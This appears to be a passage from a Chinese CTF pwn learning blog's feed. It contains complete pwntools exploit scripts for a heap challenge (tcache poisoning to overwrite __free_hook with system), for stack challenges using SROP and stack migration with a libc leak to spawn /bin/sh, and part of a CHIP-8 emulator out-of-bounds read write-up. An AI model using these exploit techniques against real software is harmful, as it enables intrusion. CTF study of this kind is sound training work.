class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./cf33&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,27946)</span><br>elf=ELF(<span class="hljs-string">&quot;./cf33&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;index&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;size&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">&quot;something&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;gift :0x&quot;</span>)<br>heap_base=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x11e70</span><br>log.success(<span class="hljs-string">&quot;heap_base=&quot;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    remove(i)<br><span class="hljs-comment">#debug()</span><br>remove(<span class="hljs-number">7</span>)<br>remove(<span class="hljs-number">8</span>)<br>remove(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">17</span>):<br>    add(i,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>add(<span class="hljs-number">17</span>,<span class="hljs-number">0x70</span>,p64(heap_base+<span class="hljs-number">0x10</span>))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">18</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>add(<span class="hljs-number">19</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br><span class="hljs-comment">#debug()</span><br>payload=(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">35</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(heap_base+<span class="hljs-number">0x10</span>)*<span class="hljs-number">6</span><br><span class="hljs-comment">#print(payload)</span><br>add(<span class="hljs-number">20</span>,<span class="hljs-number">0x70</span>,payload)<br><span class="hljs-comment">#debug()</span><br>remove(<span class="hljs-number">20</span>)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">21</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">22</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;gift :0x&quot;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&quot;libc_base=&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">23</span>,<span class="hljs-number">0x50</span>,(<span class="hljs-string">b&#x27;\x07&#x27;</span>*<span class="hljs-number">10</span>).ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]) * <span class="hljs-number">2</span>)<br>add(<span class="hljs-number">24</span>,<span class="hljs-number">0x10</span>,p64(libc_base+libc.sym[<span class="hljs-string">&quot;system&quot;</span>]))<br><span class="hljs-comment">#debug()</span><br>remove(<span class="hljs-number">10</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>主要思路是在19次达成stash之后, 从第20次起改掉0x250的count位和小chunk的链表头, 使结构体chunk进入unsorted, 再分配2次即可分配到libc里, 通过输出地址leak libc</p><p>然后再次劫持, 把链表头改成free_hook即可, 后续是常规过程.</p><h2 id="0x04-Others">0x04 Others</h2><p>在脱离用户态之前这里希望都可以一直更新, 能一直写下去就好.</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Advanced Stack Summary</title>
    <link href="/2023/10/22/Stack/"/>
    <url>/2023/10/22/Stack/</url>
    
    <content type="html"><![CDATA[<p>高档栈题的一点点总结</p><span id="more"></span><h2 id="0x00-O-o">0x00 O.o</h2><p><s>一般的0x00是废话环节</s>…</p><p>前段时间有一天突然有种水平上不去下不来的感觉, 水平说高不高说低不低, 很奇怪, 跟前辈聊了聊, wings给了个建议是做个总结, 一想, 也没什么坏处, 于是写几个高档的栈题的点, 大概是3个, 迁移, srop, ret2dlresolve.</p><blockquote><p>癌症晚期了, 👴8💊当白银</p></blockquote><p>后续应该还会加点别的, 毕竟栈题这一块还是有不少的小的东西, 例如一些好玩的fmt.</p><blockquote><p>23.10.23：目前下面的题应该全是newstar week3的, week3的题很不错, 一道多次迁移, 一道srop, 一道rtdlr, 缺的营养这一块给补上来了, 饱饱的, <s>也正好是我写这个东西的原因</s></p></blockquote><h2 id="0x01-Srop">0x01 Srop</h2><blockquote><p><s>个人觉得是一个比较奇怪的东西</s>😔</p></blockquote><h3 id="原理">原理</h3><p>主要利用signal机制, linux下一个程序中断的机制, 中断时, 内核为保存程序的上下文, 将所有寄存器信息入栈.</p><p><strong>中断结束后, 内核将执行sigreturn系统调用, 根据之前入栈的信息将寄存器恢复, 由于该空间可写, 故可以被伪造, 并且由于内核将sigreturn的地址放在栈顶, 故利用时只需要将伪造的frame串放置于系统调用地址后方</strong></p><blockquote><p>其实这个地方不是很确定, 但是实际上很多情况下都是这么利用的, 应该就是因为实际上的frame就在那个地址的后方去达到伪造的作用的.</p><p><img src="https://image.3001.net/images/20151128/14487175105930.png!small" alt="image.png"></p><p>看过最近的几个题之后我觉得似乎确实就是这样的, 至于之前的题有可能出现不是紧邻, 感觉两种情况, 1是题的情况不同要具体分析, 2是<s>我是个猪鼻没看明白</s></p></blockquote><p>由于功能非常强大, 故只要有syscall, 有/bin/sh串 的地址, 可以构造出一次调用, 即可随意getshell, .并且如果一次不能getshell的话, 可以随意控制sp ip寄存器, 不必担心例如迁移, 初始化等等导致的栈环境变化, 这便导致了这种方法的杀伤力非常之强.</p><p>上周newstar里面的srop相对来说比较简单, 小移一次bp多构造一次read输入到可控的bss段即可.</p><blockquote><p><s>然后上周这个猪鼻因为frame里面系统调用号写成0x59以至于卡了半个晚上跑了, 我自己觉得是有点难绷的</s></p></blockquote><p>如果要多次利用, 将ip的位置指向syscall ret即可, 应该syscall函数也是可以的(我不知道我没试过), 总之pop一步ip将sp(也就是下一个构造好的sropframe地址)pop进ip即可.</p><h3 id="exp">exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./srop&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./srop&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>syscall=<span class="hljs-number">0x401040</span><br>bss=<span class="hljs-number">0x404500</span><br>leave=<span class="hljs-number">0x401171</span><br>rdiret=<span class="hljs-number">0x401203</span><br><br>srop1=SigreturnFrame()<br>srop1.rdi=<span class="hljs-number">59</span><br>srop1.rsi=bss-<span class="hljs-number">0x30</span><br>srop1.rdx=<span class="hljs-number">0</span><br>srop1.rcx=<span class="hljs-number">0</span><br>srop1.rsp=bss<br>srop1.rip=syscall<br><br><span class="hljs-comment">#debug()</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(leave)<br>r.sendline(payload)<br><br><span class="hljs-comment">#debug()</span><br>payload=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(rdiret)+p64(<span class="hljs-number">15</span>)+p64(syscall)+<span class="hljs-built_in">bytes</span>(srop1)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>感觉机制比较奇怪, 但是可能实际用起来意外的好用, <s>不是很懂你们内核的机制</s></p><h2 id="0x02-Migration">0x02 Migration</h2><p>这个知识点其实困扰了我个人很久, 因为迁移前后栈环境似乎会有很多微小的变化, 并且对于这种方法我始终有一种别扭的感觉在里面, 一到多次迁移就可能会在sp或者哪里出一些莫名其妙的问题.</p><h3 id="原理-v2">原理</h3><p>原理感觉很简单, 主要利用函数调用结束的一些规矩, rop实际在leave ret时发挥作用, 但是如果在栈空间过小以至于只够溢出不够使用时, 普遍使用重复leave ret将sp和bp拉走, 迁移到我们想要的位置, 诸如bss段/已知栈地址.</p><p>这是比较好懂的, 但是实际应用过程并不是很简单的在后面加一步leave ret, 很多时候输入次数不够, 常常选择先将bp拉走, 根据缓冲区以bp寻址的特点迁移布栈, 最后布栈完成一步leave ret将ip拉来开始执行.</p><p>例题有说是newstar week3的题.</p><h3 id="exp-v2">exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./mig&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./mig&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>putsplt=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>putsgot=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>bss=elf.bss()+<span class="hljs-number">0xa00</span><br>rdiret=<span class="hljs-number">0x4012b3</span><br>rbpret=<span class="hljs-number">0x40115d</span><br>leaveret=<span class="hljs-number">0x401227</span><br>ret=<span class="hljs-number">0x40101a</span><br>read=<span class="hljs-number">0x4011f3</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+p64(bss)+p64(read)<br>r.send(payload)<br><br><span class="hljs-comment">#debug()</span><br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=p64(rdiret)+p64(putsgot)+p64(putsplt)+p64(rbpret)+p64(bss+<span class="hljs-number">0x100</span>)+p64(read)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>payload+=p64(bss-<span class="hljs-number">0x58</span>)+p64(leaveret)<br>r.send(payload)<br><br>putsaddr=u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,putsaddr)<br>libcbase=putsaddr-libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sysaddr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binshaddr=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>gdb.attach(r)<br>pause()<br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=p64(rdiret)+p64(binshaddr)+p64(sysaddr)<br>payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(bss+<span class="hljs-number">0xa8</span>)+p64(leaveret)<br><br>r.send(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>有个点需要注意, 在后续过程中很有可能sp会因为调用函数的时候开栈帧被拉回来, 由于0x1000页对齐, bss段其实是很大一部分, 如果偏移写少了拉回来就挂掉了, 所以迁bss的时候普遍要往更高地址迁, 诸如这个0xa00.</p><blockquote><p>这个题第一次迁移的时候要拉bp似乎也算是个特别的点.</p></blockquote><h2 id="0x03-ret2dlresolve">0x03 ret2dlresolve</h2><p>没怎么看懂, 过两天再看看往这补8🔨</p><blockquote><p>为了这盘醋包的饺子, 但是今天有点晚了, 小🕊️一手</p></blockquote><h2 id="0x04-Others">0x04 Others</h2><p>week3的时候, 周一晚上做第二道题能通本地不能通远程, 找了一晚上原因也不知道是为什么, 然后写srop, 写完卡在奇怪的系统调用上, <s>当时没发现是0x59的调用号</s>, 干脆跑了不做了, 然后这周搭博客+做一道vm+干了些别的事情就到今天, 倚着官方的wp从头到尾看了看自己没什么水平的栈, 突然意识到一个问题:</p><p>思维有点死, 例如那个srop我甚至没能想到多次利用程序已有的read输入, 做pwn原本应该多活跃一下思维去利用应有的东西的, 但是好像做的时候并没有想到可以拿一些片段性的程序出来用, 老毛病了, 再做题先晃晃脑袋.</p><blockquote><p>栈迁移的先迁bp再寻址读入拉sp也是前段时间才学到的</p></blockquote><p>不知道是不是做的题太少了, 还是最近就没怎么做这一类的灵活栈题, 堆题也没怎么做, 那我到底干啥了（x</p><p>除了学方法的同时, 感觉也要适当去哪里刷点题什么的, 最近要恢复刷各种比赛和buu, nss了.</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>Stack</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PWNmeCTF CHIP-8 复现</title>
    <link href="/2023/10/18/CHIP-8/"/>
    <url>/2023/10/18/CHIP-8/</url>
    
    <content type="html"><![CDATA[<p>这种VMpwn对带🔥来说刚刚好, 而对我这个♿就有丶超前🌶️😭</p><span id="more"></span><h2 id="0x00-材料">0x00 材料</h2><p>一个叫PWNME的比赛的一道题, 链接在这, 以下是照着wp算是复现的过程, 总之是看的想死😭</p><p><a href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/chip8">CHIP-8github原网址</a></p><h2 id="0x01-分析">0x01 分析</h2><p>拿来之后发现clone了一个仓库, 大致一看, 应该像是一个chip8语言的模拟器, 似乎也可以说是一个vm.</p><p>CHIP-8, 小查了一下:</p><p><a href="https://en.wikipedia.org/wiki/CHIP-8">https://en.wikipedia.org/wiki/CHIP-8</a></p><p><img src="image-20231018212805437.png" alt="image-20231018212805437"></p><blockquote><p><s>这个人的英语目前像屎所以还是要靠谷歌翻译x  x</s></p></blockquote><p>给了一个patch, 这个patch分析一下, 最主要的功能感觉应该就是<code>把flag扔进去</code>, 告诉你flag在这里了.</p><p>其次下面看着是调试性的语句也给加了点注释, 还有main函数里关闭缓冲的初始化性质语句.</p><p><strong>patch里面有关flag的部分是在Machine类里面, 看一下这个类</strong>:</p><ul><li><p>在<code>Machine.hpp</code>中, 定义了一堆莫名其妙的东西, 但是可以看懂有<code>register</code>, <code>stack</code>, <code>memory</code>这种很熟悉的字样, 具体联系这个维基百科稍微看看:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Machine</span>&#123;<br><span class="hljs-keyword">private</span>:<br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; registers; <span class="hljs-comment">// V0-VF</span><br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; memory; <span class="hljs-comment">// Memory</span><br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; flag;<br><span class="hljs-type">uint16_t</span> I; <span class="hljs-comment">// Index register</span><br>std::vector&lt;<span class="hljs-type">uint16_t</span>&gt; stack; <span class="hljs-comment">// Stack</span><br><span class="hljs-type">uint8_t</span> SP; <span class="hljs-comment">// Stack Pointer</span><br><span class="hljs-type">uint8_t</span> DT; <span class="hljs-comment">// Delay Timer</span><br><span class="hljs-type">uint8_t</span> ST; <span class="hljs-comment">// Sound Timer</span><br>GraphicEngine ge; <span class="hljs-comment">// Holds Graphics and frame buffer</span><br>Keyboard kb; <span class="hljs-comment">// presents Keyboard related functions</span><br><span class="hljs-type">uint16_t</span> PC; <span class="hljs-comment">// Program Counter</span><br>std::chrono::steady_clock::time_point last_tick;<br><br><span class="hljs-comment">// Methods</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">execute</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>&amp; opcode)</span></span>;<br><span class="hljs-function"><span class="hljs-type">uint8_t</span> <span class="hljs-title">random_byte</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_machine_state</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update_timers</span><span class="hljs-params">(<span class="hljs-type">const</span> std::chrono::steady_clock::time_point&amp; now)</span></span>;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Machine</span>();<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setInst</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">uint8_t</span>&gt;&amp; prog, <span class="hljs-type">uint16_t</span> start_addr)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">runLoop</span><span class="hljs-params">()</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="image-20231019180155003.png" alt="image-20231019180155003"></p></li></ul><p>对比看一下可以大致明白是个什么东西了, 感觉里面这个I应该是比较重要的东西之一</p><ul><li><p>然后是<code>Machine.cpp</code>,</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Machine::<span class="hljs-built_in">Machine</span>()&#123;<br>registers = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>);<br>stack = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint16_t</span>&gt;(<span class="hljs-number">32</span>, <span class="hljs-number">0</span>);<br>memory = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">4096</span>, <span class="hljs-number">0</span>);<br>flag = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">128</span>, <span class="hljs-number">0</span>);<br>PC = <span class="hljs-number">0x200</span>;<br>last_tick = std::chrono::steady_clock::<span class="hljs-built_in">now</span>();<br>I = <span class="hljs-number">0</span>;<br>SP = <span class="hljs-number">0</span>;<br>DT = <span class="hljs-number">0</span>;<br>ST = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>这个应该是Machine的构造函数, 16个寄存器, 大小为32的栈和4096(0x1000)的内存, PC可以从上面知道是程序的计数器, 所以似乎是从0x200开始的.</p><p>内存过后直接是flag, 所以可能思路就是越界到flag</p><h2 id="0x02-过程-利用">0x02 过程+利用</h2><p>刚才把他到底是什么东西分析了个大概, 现在开始看怎么跑, 跑什么东西</p><p>给的dockerfile里面跑的是wrapper, wrapper实际跑一下, 感觉实际作用就是传入一个ROM code.</p><p>这个rom应该和 ↓应该是同一套的东西</p><p><img src="image-20231019190936098.png" alt="image-20231019190936098"></p><p>给了wrapper.c, 大概看了一下发现确实是这样的, 这个rom code会传进这一套文件里.</p><blockquote><p>在这里传进的ROMcode再分析一下会发现实际上应该也就是后续的opcode?但是不管怎样, 这里是唯一的输入了</p><p><strong>opcode</strong>应该算是控制vm的一些代码了, 这个题由于有着chip-8的背景, opcode可以说完全透明.</p></blockquote><p>漏洞和利用的话, 似乎这个题的漏洞相对来说属于很简单的, 根据分析可以知道flag就在内存块的后面, 所以应该是一个越界的漏洞, 但是实际上跑了一下, 发现除了一块黑框, 完全没有什么输出.</p><blockquote><p>之前没patch瞎鼓捣的时候发现会有一些信息出来, 但是patch过后如上面所说, 调试信息是关闭的, 打不出来东西, 起初我以为是我的步骤哪里出问题以至于把这玩意玩坏了,后来发现并不是这样.</p></blockquote><p>但是翻一下opcode表会发现有一个很奇怪的东西:</p><p><img src="image-20231019203235549.png" alt="image-20231019203235549"></p><p>于是这个题的flag的输出方式疑似是很匪夷所思的用这个黑框画出来, 这条opcode是从I开始读, 所以我们只需要让I等于我们的flag地址即可, flag地址是0x1010.</p><p>主要可以利用以下几个命令:</p><p><img src="image-20231019222825584.png" alt="image-20231019222825584"></p><p><img src="image-20231019222858938.png" alt="image-20231019222858938"></p><p><img src="image-20231019223158918.png" alt="image-20231019223158918"></p><p>这个地方直接拿百科上查到的了, 和在.cpp文件里看到的opcode几乎没有任何差别,</p><blockquote><p>然后找到一篇文章, <a href="https://ctftime.org/writeup/37026">CTFtime.org / PwnMe Qualifications : “8 bits” / chip8 / Writeup</a> , 疑似是官方的wp?</p><p>应该是个很不错的解释:</p></blockquote><ul><li><p>Here are the instruction we need:</p><ul><li><code>Annn</code> - <code>LD I, addr</code>. Set I = nnn. The value of register I is set to nnn.</li><li><code>6xkk</code> - <code>LD Vx, byte</code>, Set Vx = kk. The interpreter puts the value kk into register Vx.</li><li><code>Fx1E</code> - <code>ADD I, Vx</code>. Set I = I + Vx. The values of I and Vx are added, and the results are stored in I.</li><li><code>Dxyn</code> - <code>DRW Vx, Vy, nibble</code>. Display n-byte sprite starting at memory location I at (Vx, Vy), set VF = collision. The interpreter reads n bytes from memory, starting at the address stored in I. These bytes are then displayed as sprites on screen at coordinates (Vx, Vy). Sprites are XORed onto the existing screen. If this causes any pixels to be erased, VF is set to 1, otherwise it is set to 0. If the sprite is positioned so part of it is outside the coordinates of the display, it wraps around to the opposite side of the screen. See instruction 8xy3 for more information on XOR, and section 2.4, Display, for more information on the Chip-8 screen and sprites.</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">n <span class="hljs-keyword">or </span>nibble - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the lowest <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>x - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the lower <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the high <span class="hljs-keyword">byte </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>y - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the upper <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the low <span class="hljs-keyword">byte </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>kk <span class="hljs-keyword">or </span><span class="hljs-keyword">byte </span>- An <span class="hljs-number">8</span>-<span class="hljs-keyword">bit </span>value, the lowest <span class="hljs-number">8</span> <span class="hljs-keyword">bits </span>of the <span class="hljs-keyword">instruction </span><br></code></pre></td></tr></table></figure></li></ul><p><img src="image-20231019224646952.png" alt="image-20231019224646952"></p><blockquote><p>这篇文章的写法, “由于I是16位寄存器, 故这个draw指令可以打印出xxx内存的东西”,自然包括0x1010</p></blockquote><h2 id="0x03-exp">0x03 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td 